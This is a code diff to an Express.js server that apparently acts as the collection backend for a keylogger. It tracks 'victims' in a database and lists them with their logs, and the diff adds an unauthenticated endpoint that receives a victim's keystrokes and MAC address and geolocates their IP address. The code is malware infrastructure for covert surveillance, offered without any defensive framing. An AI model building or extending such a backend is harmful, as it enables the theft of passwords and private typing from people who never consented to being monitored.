@@ -1,6 +1,8 @@
 var path = require('path');
 var express = require('express');
 var router = express.Router();
+var request = require('request');
+
 const config = require('../config');
 
 // set up database
@@ -22,7 +24,9 @@ Victim.Logs = Victim.hasMany(Log, {
 
 sequelize.sync({
   force: true
-}).then(()=> {
+})
+.then(()=> {
+  console.log("Set up database successfully");
   // TODO: remove test-case
   victim = Victim.create({
     ip: '39.136.14.94',
@@ -73,7 +77,7 @@ router.use('/victims', (req, res, next) => {
  * 
  * @apiSuccess {Array} victims victims which are already tracked
  */
-router.get('/victims', (req, res, next) => {
+router.get('/victims', (req, res) => {
   Victim.all()
     .then(victims => {
         res.json(victims);
@@ -91,10 +95,10 @@ router.get('/victims', (req, res, next) => {
  * @apiParam {Number} id Victims unique id
  * @apiSuccess {Victim} victim single victim which is already tracked
  */
-router.get('/victims/:id', (req, res, next) => {
+router.get('/victims/:id', (req, res) => {
   Victim.findById(req.params.id).then(victim => {
     if(victim == null)
-      res.json({error: "not found"});
+      res.status(404).json({error: "not found"});
     else
       res.json(victim);
   });
@@ -111,7 +115,7 @@ router.get('/victims/:id', (req, res, next) => {
  * @apiParam {Number} id Victims unique id
  * @apiSuccess {Victim} victim single victim which is already tracked
  */
-router.get('/victims/:id/logs', (req, res, next) => {
+router.get('/victims/:id/logs', (req, res) => {
   Victim.findById(req.params.id).then(victim => {
     if(victim == null)
       res.json({error: "not found"});
@@ -122,4 +126,36 @@ router.get('/victims/:id/logs', (req, res, next) => {
   });
 });
 
+/**
+ * @api {post} /api/log Log the keystrokes
+ * @apiName AddKeystrokes
+ * @apiGroup Log
+ * 
+ * @apiPermission None
+ * 
+ * @apiParam {MACAddress} string Victims MAC
+ * @apiParam {keystrokes} string keystrokes which have been tracked
+ */
+router.post('/log', (req, res) => {
+  var ip = req.connection.remoteAddress;
+  // FIXME: rem default ip
+  ip = "212.152.179.113";
+  var useragent = req.headers['user-agent'];
+  var macAdress = req.body.macAdress;
+
+  request.get('http://ip-api.com/json/' + ip, (error, response, body) => {
+    if (!error && response.statusCode == 200) {
+      var ipInfo = JSON.parse(body);
+
+      if(ipInfo.status == 'fail')
+        res.status(400).json({ error: ipInfo.message })
+      else {
+        // TODO: insert in database
+        console.log(ip, useragent, ipInfo)
+
+        res.json({ip, useragent, ipInfo})
+      }
+    }
+  })
+});
 module.exports = router;
